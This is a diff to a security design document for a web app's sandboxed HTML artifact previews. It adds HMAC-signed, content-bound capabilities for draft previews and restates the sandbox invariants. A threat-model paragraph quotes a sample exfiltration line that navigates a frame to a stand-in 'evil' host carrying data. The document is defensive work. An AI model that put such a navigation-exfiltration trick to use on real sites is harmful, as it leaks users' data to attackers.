@@ -54,7 +54,7 @@ Implemented in: `app/Http/Support/ArtifactSandboxResponder.php` (shared header C
 `app/Application/PageCatalog/ArtifactPreviewDocumentGuard.php` (the guard),
 `resources/views/pages/show.blade.php` (embedding iframe).
 
-**Keeping artifacts embedded.** The iframe `sandbox` protects only while the artifact is *embedded*. So the artifact host serves artifact HTML only to iframe embeds (`Sec-Fetch-Dest: iframe`, a browser-set header page script cannot forge) and refuses top-level document loads. This stops an artifact from being opened as its own page, where the sandbox attribute would no longer apply and downloads, self-initiated fullscreen/pointer-lock, and same-origin storage on the shared artifact host would return. On the **saved** artifact path an absent `Sec-Fetch-Dest` (legacy client, or a proxy that strips it) fails open so embedding keeps working — the only residual is a non-modern browser, which lacks the sandbox protections regardless, and the header CSP `sandbox` directive still forces an opaque origin. The **draft** reflector (§5) is stricter: it fails *closed*, serving only when `Sec-Fetch-Dest: iframe` is explicitly present. The preview controllers enforce this through `ArtifactSandboxResponder`.
+**Keeping artifacts embedded.** The iframe `sandbox` protects only while the artifact is *embedded*. So the artifact host serves artifact HTML only to iframe embeds (`Sec-Fetch-Dest: iframe`, a browser-set header page script cannot forge) and refuses top-level document loads. This stops an artifact from being opened as its own page, where the sandbox attribute would no longer apply and downloads, self-initiated fullscreen/pointer-lock, and same-origin storage on the shared artifact host would return. On the **saved** artifact path an absent `Sec-Fetch-Dest` (legacy client, or a proxy that strips it) fails open so embedding keeps working — the only residual is a non-modern browser, which lacks the sandbox protections regardless, and the header CSP `sandbox` directive still forces an opaque origin. The **draft** receiver (§5) is stricter: it requires a valid content-bound capability and fails *closed* unless `Sec-Fetch-Dest: iframe` is explicitly present. The preview controllers enforce this through `ArtifactSandboxResponder`.
 
 **Known residual: navigation-based exfiltration.** A sandboxed frame can always navigate *itself* (only *top* navigation needs `allow-top-navigation`), and no shipped CSP directive blocks it (`navigate-to` was dropped). So `location = 'https://evil/?data'` cannot be fully prevented while artifacts run scripts. It is bounded by the isolated origin (no cookies/session/other-tenant data to steal), so the only exposure is data a user is socially engineered into entering, the viewer's IP, and view confirmation. Mitigated by user-facing "untrusted artifact" framing, not by a header.
 
@@ -115,11 +115,20 @@ Rules that follow:
 The pre-save draft preview (`resources/js/html-draft-preview.js`,
 `resources/views/pages/create.blade.php`) renders unsaved HTML **on the isolated artifact
 origin**, using the exact same hardened sandbox response as a saved artifact
-(`ArtifactSandboxResponder`). The create page submits the draft via a cross-origin **form POST
-into the sandbox iframe** (`POST /artifact-previews/draft`,
-`app/Http/Controllers/ArtifactDraftPreviewController.php`); the browser loads the response as a
-document on the artifact origin, so it does **not** run on the cookie-bearing main origin and
-does **not** inherit the main app CSP.
+(`ArtifactSandboxResponder`). First, the create page hashes the exact UTF-8 draft bytes and asks
+the authenticated app endpoint (`POST /pages/draft-preview-capabilities`) for permission. That
+CSRF-protected endpoint enforces live Editor-or-Admin page-creation authority in the selected
+workspace and a per-user rate limit, then returns an HMAC-signed capability valid for at most 60
+seconds. The signed payload binds capability-schema version, purpose, configured artifact origin,
+workspace UID, expiry, a random nonce, exact byte length, and SHA-256; the raw HTML is not sent to
+this app endpoint.
+
+The create page then submits the draft and capability via a cross-origin **form POST into the
+sandbox iframe** (`POST /artifact-previews/draft`,
+`app/Http/Controllers/ArtifactDraftPreviewController.php`). The cookieless artifact runtime
+verifies the HMAC, origin, purpose, canonical claims, expiry, exact length, and SHA-256 before it
+reflects any bytes. The browser loads the response as a document on the artifact origin, so it
+does **not** run on the cookie-bearing main origin and does **not** inherit the main app CSP.
 
 It deliberately does **not** use a `srcdoc` iframe on the main origin: `srcdoc` inherits the
 embedding page's CSP (`style-src 'self' 'nonce-…'`, no `unsafe-inline`), which silently dropped
@@ -129,18 +138,26 @@ artifact, so the preview is a true match.
 
 It is safe **only** because:
 
-- the endpoint is **stateless and never persists** — it echoes the posted HTML back hardened,
+- capability issuance is authenticated, CSRF-protected, workspace-authorized, rate-limited,
+  short-lived, content-bound, and fails closed; malformed, expired, or mismatched capabilities
+  receive the same 404 without logging attacker-controlled content or token material,
+- the artifact endpoint is **stateless and never persists** — after capability verification it
+  echoes the posted HTML back hardened,
 - the response carries the artifact sandbox CSP (`default-src 'none'; sandbox allow-scripts;
   connect-src 'none'; …`) plus `frame-ancestors <app-origin>`, so the reflected document has an
   **opaque origin** with no network, storage, or same-origin access, and
 - the iframe keeps `sandbox="allow-scripts"` **without `allow-same-origin`** as defense in depth,
   and the endpoint refuses top-level (`Sec-Fetch-Dest` ≠ `iframe`) navigation.
 
-**Invariants:** the draft endpoint MUST stay session-free and non-persisting; the response MUST
-keep the artifact sandbox CSP; the iframe MUST keep `sandbox` without `allow-same-origin`. The
-app CSP's `form-action` allows only `'self'` and the artifact origin so this cross-origin POST
-succeeds — do not widen it further. Regression-pinned in `tests/e2e/editor.spec.ts` (inline styles render;
-isolation holds) and `tests/Feature/PageCatalog/ArtifactDraftPreviewHttpTest.php`.
+**Invariants:** capability issuance MUST remain on the authenticated app origin, enforce live
+page-creation authority, and bind the configured artifact origin plus exact draft bytes. The
+artifact receiver MUST stay session-free and non-persisting; the response MUST keep the artifact
+sandbox CSP; the iframe MUST keep `sandbox` without `allow-same-origin`. The app CSP's
+`form-action` allows only `'self'` and the artifact origin so this cross-origin POST succeeds — do
+not widen it further. Capabilities are short-lived bearer tokens: replay of the same exact draft
+within their TTL is intentionally harmless, while use for another origin or content fails.
+Regression-pinned in `tests/e2e/editor.spec.ts` (real authenticated issuance, inline styles,
+isolation) and `tests/Feature/PageCatalog/ArtifactDraftPreviewHttpTest.php`.
 
 ---
 
